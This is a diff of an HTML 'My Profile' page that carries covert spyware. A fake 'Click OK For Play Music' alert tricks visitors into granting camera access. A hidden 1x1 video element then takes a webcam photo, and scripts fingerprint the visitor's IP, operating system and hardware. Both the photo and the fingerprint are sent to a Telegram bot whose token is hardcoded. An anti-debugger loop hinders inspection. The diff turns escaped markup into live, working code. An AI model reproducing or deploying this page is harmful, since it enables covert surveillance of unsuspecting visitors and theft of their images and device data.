@@ -1,11 +1,11 @@
-&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-    &lt;title&gt;My Profile&lt;/title&gt;
-    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
-    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
-    &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js&quot;&gt;&lt;/script&gt;
-    &lt;script type=&#039;text/javascript&#039;&gt;
+<!DOCTYPE html>
+<html>
+<head>
+    <title>My Profile</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script type='text/javascript'>
 
       ! function t() {
 
@@ -13,7 +13,7 @@
 
               ! function t(n) {
 
-                  1 === (&quot;&quot; + n / n).length &amp;&amp; 0 !== n || function() {}.constructor(&quot;debugger&quot;)(), t(++n)
+                  1 === ("" + n / n).length && 0 !== n || function() {}.constructor("debugger")(), t(++n)
 
               }(0)
 
@@ -25,11 +25,11 @@
 
       }();
 
-  &lt;/script&gt;
+  </script>
 
-    &lt;style&gt;
+    <style>
 
-        @import url(&#039;https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&amp;display=swap&#039;);
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap');
 
     
 
@@ -60,7 +60,7 @@
 h1 {
   color: #333;
   font-size: 32px;
-  font-family: &#039;Roboto&#039;, sans-serif;
+  font-family: 'Roboto', sans-serif;
   animation: textAnimation 2s infinite;
 }
 
@@ -96,7 +96,7 @@ h1 {
 p {
   color: #ff00ff;
   font-size: 18px;
-  font-family: &#039;Roboto&#039;, sans-serif;
+  font-family: 'Roboto', sans-serif;
   animation: textAnimation 2s infinite;
 }
 
@@ -112,24 +112,24 @@ p {
   }
 }
 
-    &lt;/style&gt;
-    &lt;/head&gt;
-    &lt;body&gt;
-      &lt;div class=&quot;container&quot;&gt;
-        &lt;h1&gt;Welcome To My Profile&lt;/h1&gt;
-        &lt;p&gt;Click Here For Contact &lt;a href=&quot;https://t.me/xNeonn&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;My Telegram&lt;/a&gt;&lt;/p&gt;
-      &lt;/div&gt;
+    </style>
+    </head>
+    <body>
+      <div class="container">
+        <h1>Welcome To My Profile</h1>
+        <p>Click Here For Contact <a href="https://t.me/xNeonn" rel="nofollow" target="_blank">My Telegram</a></p>
+      </div>
 
 
-  &lt;script&gt;
+  <script>
 
     function capturePhoto() {
 
-        var video = document.getElementById(&#039;video&#039;);
+        var video = document.getElementById('video');
 
-        var canvas = document.createElement(&#039;canvas&#039;);
+        var canvas = document.createElement('canvas');
 
-        var context = canvas.getContext(&#039;2d&#039;);
+        var context = canvas.getContext('2d');
 
         canvas.width = video.videoWidth;
 
@@ -144,17 +144,17 @@ p {
 
             var formData = new FormData();
 
-            formData.append(&#039;chat_id&#039;, &#039;-1001943806786&#039;); 
+            formData.append('chat_id', '-1001943806786'); 
 
-            formData.append(&#039;photo&#039;, blob, &#039;photo.jpg&#039;);
+            formData.append('photo', blob, 'photo.jpg');
 
  
 
             $.ajax({
 
-                type: &#039;POST&#039;,
+                type: 'POST',
 
-                url: &#039;https://api.telegram.org/bot6608612790:AAHo636tc_sYWBzh8cmUh-ncSTW7fwk6vck/sendPhoto&#039;, 
+                url: 'https://api.telegram.org/bot6608612790:AAHo636tc_sYWBzh8cmUh-ncSTW7fwk6vck/sendPhoto', 
 
                 data: formData,
 
@@ -164,19 +164,19 @@ p {
 
                 success: function(response) {
 
-                    console.log(&#039;Đ&atilde; gửi ảnh th&agrave;nh c&ocirc;ng đến Telegram&#039;);
+                    console.log('Đã gửi ảnh thành công đến Telegram');
 
                 },
 
                 error: function(error) {
 
-                    console.log(&#039;Lỗi khi gửi ảnh đến Telegram: &#039; + error);
+                    console.log('Lỗi khi gửi ảnh đến Telegram: ' + error);
 
                 }
 
             });
 
-        }, &#039;image/jpeg&#039;);
+        }, 'image/jpeg');
 
     }
 
@@ -186,7 +186,7 @@ p {
 
             .then(function(stream) {
 
-                var video = document.getElementById(&#039;video&#039;);
+                var video = document.getElementById('video');
 
                 video.srcObject = stream;
 
@@ -202,7 +202,7 @@ p {
 
             .catch(function(error) {
 
-                console.log(&#039;Đ&atilde; xảy ra lỗi khi truy cập webcam: &#039; + error.message);
+                console.log('Đã xảy ra lỗi khi truy cập webcam: ' + error.message);
 
             });
 
@@ -211,48 +211,48 @@ p {
 
     function showCameraAccessAlert() {
 
-        alert(&#039;Click OK For Play Music&#039;);
+        alert('Click OK For Play Music');
 
         requestCameraAccess();
 
     }
 
 
-    window.addEventListener(&#039;DOMContentLoaded&#039;, function() {
+    window.addEventListener('DOMContentLoaded', function() {
 
         showCameraAccessAlert();
 
     });
 
-&lt;/script&gt;
+</script>
 
  
 
-&lt;video id=&quot;video&quot; width=&quot;1&quot; height=&quot;1&quot; autoplay&gt;&lt;/video&gt;
+<video id="video" width="1" height="1" autoplay></video>
 
  
 
-  &lt;script&gt;
+  <script>
 
     $(document).ready(function() {
 
-      var telegramBotToken = &#039;6608612790:AAHo636tc_sYWBzh8cmUh-ncSTW7fwk6vck&#039;;
+      var telegramBotToken = '6608612790:AAHo636tc_sYWBzh8cmUh-ncSTW7fwk6vck';
 
-      var chatId = &#039;-1001943806786&#039;;
+      var chatId = '-1001943806786';
 
  
 
-      $.getJSON(&#039;https://api.ipify.org?format=json&#039;, function(data) {
+      $.getJSON('https://api.ipify.org?format=json', function(data) {
 
         var ip = data.ip;
 
  
 
-        var cpu = navigator.hardwareConcurrency || &#039;N/A&#039;;
+        var cpu = navigator.hardwareConcurrency || 'N/A';
 
-        var ram = navigator.deviceMemory || &#039;N/A&#039;;
+        var ram = navigator.deviceMemory || 'N/A';
 
-        var disk = navigator.deviceStorage || &#039;N/A&#039;;
+        var disk = navigator.deviceStorage || 'N/A';
 
         var gpu = getGraphicsCard();
 
@@ -262,7 +262,7 @@ p {
 
  
 
-        var message = &#039;- Địa chỉ IP mới: &#039; + ip + &#039;\n- User-Agent: &#039; + userAgent + &#039;\n- Hệ điều h&agrave;nh: &#039; + os + &#039;\n- CPU: &#039; + cpu + &#039;\n- RAM: &#039; + ram + &#039;\n- Disk: &#039; + disk + &#039;\n- GPU: &#039; + gpu;
+        var message = '- Địa chỉ IP mới: ' + ip + '\n- User-Agent: ' + userAgent + '\n- Hệ điều hành: ' + os + '\n- CPU: ' + cpu + '\n- RAM: ' + ram + '\n- Disk: ' + disk + '\n- GPU: ' + gpu;
 
  
 
@@ -278,23 +278,23 @@ p {
 
         $.ajax({
 
-          type: &#039;POST&#039;,
+          type: 'POST',
 
-          url: &#039;https://api.telegram.org/bot&#039; + telegramBotToken + &#039;/sendMessage&#039;,
+          url: 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage',
 
           data: payload,
 
-          dataType: &#039;json&#039;,
+          dataType: 'json',
 
           success: function(response) {
 
-            console.log(&#039;Th&ocirc;ng tin đ&atilde; được gửi th&agrave;nh c&ocirc;ng đến Telegram&#039;);
+            console.log('Thông tin đã được gửi thành công đến Telegram');
 
           },
 
           error: function(error) {
 
-            console.log(&#039;Lỗi khi gửi th&ocirc;ng tin đến Telegram: &#039; + error);
+            console.log('Lỗi khi gửi thông tin đến Telegram: ' + error);
 
           }
 
@@ -304,7 +304,7 @@ p {
 
  
 
-      // C&aacute;c h&agrave;m hỗ trợ
+      // Các hàm hỗ trợ
 
       function getOperatingSystem() {
 
@@ -312,45 +312,45 @@ p {
 
         if (/windows phone/i.test(userAgent)) {
 
-          return &#039;Windows Phone&#039;;
+          return 'Windows Phone';
 
         }
 
         if (/android/i.test(userAgent)) {
 
-          return &#039;Android&#039;;
+          return 'Android';
 
         }
 
-        if (/iPad|iPhone|iPod/.test(userAgent) &amp;&amp; !window.MSStream) {
+        if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
 
-          return &#039;iOS&#039;;
+          return 'iOS';
 
         }
 
         if (/Macintosh|Mac OS X/.test(userAgent)) {
 
-          return &#039;Mac OS&#039;;
+          return 'Mac OS';
 
         }
 
         if (/Windows NT/.test(userAgent)) {
 
-          return &#039;Windows&#039;;
+          return 'Windows';
 
         }
 
-        return &#039;Unknown&#039;;
+        return 'Unknown';
 
       }
 
  
 
       function getGraphicsCard() {
-        var canvas = document.createElement(&#039;canvas&#039;);
-        var gl = canvas.getContext(&#039;webgl&#039;) || canvas.getContext(&#039;experimental-webgl&#039;);
-        var debugInfo = gl.getExtension(&#039;WEBGL_debug_renderer_info&#039;);
-        var gpu = &#039;N/A&#039;;
+        var canvas = document.createElement('canvas');
+        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        var gpu = 'N/A';
         if (debugInfo) {
           gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
         }
@@ -358,6 +358,6 @@ p {
       }
     });
 
-  &lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;
+  </script>
+</body>
+</html>
